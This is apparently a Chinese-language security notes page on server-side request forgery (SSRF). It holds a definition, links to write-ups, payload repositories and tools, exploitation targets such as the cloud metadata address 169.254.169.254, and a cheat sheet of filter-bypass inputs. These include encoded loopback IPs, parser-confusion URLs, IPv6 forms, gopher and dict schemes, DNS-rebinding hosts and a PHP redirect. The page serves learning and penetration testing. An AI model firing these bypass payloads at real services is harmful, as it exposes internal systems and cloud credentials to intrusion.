# SSRF

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**简介**

很多 web 应用都提供了从其他的服务器上获取数据的功能.使用用户指定的 URL,web 应用可以获取图片,下载文件,读取文件内容等.这个功能如果被恶意使用,可以利用存在缺陷的 web 应用作为代理攻击远程和本地的服务器.这种形式的攻击称为服务端请求伪造攻击(Server-side Request Forgery).

一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。

**相关文章**
- [SSRF 漏洞分析及利用](https://www.knowsec.net/archives/85/)
- [浅析 SSRF 原理及利用方式](https://www.anquanke.com/post/id/145519)
- [SSRF 利用与防御](https://hellohxk.com/blog/ssrf/)
- [聊一聊ssrf漏洞的挖掘思路与技巧](https://bbs.ichunqiu.com/thread-49370-1-1.html)
- [Bypassing SSRF Protection](https://medium.com/@vickieli/bypassing-ssrf-protection-e111ae70727b)

**相关案例**
- [My First SSRF Using DNS Rebinding](https://geleta.eu/2019/my-first-ssrf-using-dns-rebinfing/)
- [SSRF in Exchange leads to ROOT access in all instances](https://hackerone.com/reports/341876) - 通过对 ssrf 访问 Google Cloud Metadata,直至 RCE
- [SSRF (Server Side Request Forgery) worth $4,913](https://medium.com/techfenix/ssrf-server-side-request-forgery-worth-4913-my-highest-bounty-ever-7d733bb368cb)
- [Just Gopher It: Escalating a Blind SSRF to RCE for $15k](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)
- [SSRF exploitation in Spreedsheet to PDF converter](https://r4id3n.medium.com/ssrf-exploitation-in-spreedsheet-to-pdf-converter-2c7eacdac781) - excel 中的 ssrf+xxe 读文件

**payload**
- [bugbounty-cheatsheet/cheatsheets/ssrf.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/ssrf.md)
- [AboutSecurity/Payload/SSRF](https://github.com/ffffffff0x/AboutSecurity/blob/master/Payload/SSRF/)

**相关工具**
- [In3tinct/See-SURF](https://github.com/In3tinct/See-SURF) - python 写的 ssrf 参数扫描工具
- [swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap) - 自动化 Fuzz SSRF 开发工具
- [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) - 该工具生成 gopher payload ，以利用 SSRF 并在各种服务器中获得 RCE

---

# 利用方式

- 内部端口扫描
- Leverage cloud services
    - 169.254.169.254
        - https://www.ibm.com/developerworks/cn/cloud/library/1620-openstack-metadata-service/index.html
- reveal IP Address & HTTP Library
    - https://webhook.site/
- Download a very large file (Layer 7 DoS)

---

# 绕过方法

**特殊 IP**
```
http://0177.1/
http://0x7f.1/
http://127.000.000.1
https://520968996
```

> The latter can be calculated using http://www.subnetmask.info/

**错误 IP**
```
http://127.1
http://0
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib : 3.3.3.3
http://127.1.1.1:80\@127.2.2.2:80/
```

**IPv6**

```
http://[::1]
http://[::]
http://[::]:80/
http://0000::1:80/
```

**Exotic Handlers**

```
gopher://, dict://, php://, jar://, tftp://
```

**DNS 欺骗**

```
10.0.0.1.xip.io
www.10.0.0.1.xip.io
mysite.10.0.0.1.xip.io
foo.bar.10.0.0.1.xip.io
```

> http://xip.io

```
10.0.0.1.nip.io
app.10.0.0.1.nip.io
customer1.app.10.0.0.1.nip.io
customer2.app.10.0.0.1.nip.io
otherapp.10.0.0.1.nip.io
```

> http://nip.io

**重定向欺骗**
```
<?php header(“location: http://127.0.0.1"); ?>
```

**编码绕过**

这些包括十六进制编码，八进制编码，双字编码，URL 编码和混合编码。

```
127.0.0.1 translates to 0x7f.0x0.0x0.0x1
127.0.0.1 translates to 0177.0.0.01
http://127.0.0.1 translates to http://2130706433
localhost translates to %6c%6f%63%61%6c%68%6f%73%74
```
